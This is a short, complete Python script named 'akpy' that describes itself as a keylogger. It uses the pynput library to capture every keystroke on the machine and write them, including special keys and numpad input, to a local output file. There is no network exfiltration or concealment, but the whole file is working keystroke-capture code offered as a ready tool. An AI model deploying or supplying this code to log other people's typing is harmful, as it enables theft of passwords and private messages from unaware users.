#!/usr/bin/env python3
import argparse

from pynput import keyboard


__version__ = '0.1.0'


def arg_parse():
    parser = argparse.ArgumentParser(
        prog="akpy",
        description="Another Keylogger. Python.",
    )
    parser.add_argument('-o', '--output',
                        help="output file name")
    parser.add_argument('-w', '--overwrite',
                        help="overwrites the file, if it does exist", action="store_true")
    parser.add_argument('-q', '--quiet',
                        help="less verbose output", action="store_true")
    parser.add_argument('--version', help="shows the version number",
                        action="version", version='%(prog)s v{version}'.format(version=__version__))
    args = parser.parse_args()
    return args


def main():
    opt = 'w' if arg_parse().overwrite else 'x'
    with keyboard.Events() as events:
        with open(arg_parse().output, opt) as file:
            for event in events:
                if str(event).startswith('Release'):
                    pass
                elif event.key == keyboard.Key.space:
                    file.write(' ')
                elif event.key == keyboard.Key.enter:
                    file.write('\n')
                elif str(event.key).startswith('Key'):
                    file.write(
                        "[" + str(event.key).split(".")[1].upper() + "]")
                elif str(event.key).startswith('<'):
                    signal_number = int(str(event.key).split('<')[1].split('>')[0])
                    numpad_number = signal_number - 96
                    key = '[NumPad' + str(numpad_number) + ']' if numpad_number != 14 else '.'
                    content = str(numpad_number) if arg_parse().quiet else key
                    file.write(content)
                else:
                    file.write(str(event.key).split("'")[1])


if __name__ == '__main__':
    try:
        print('\033[90m\033[1mRunning...\033[0m')
        main()
    except KeyboardInterrupt:
        print('\033[91m\033[1mProgram Terminated\033[0m')
    except FileExistsError:
        print('\033[91m\033[1mFile exists! specify -w to overwrite.\033[0m')
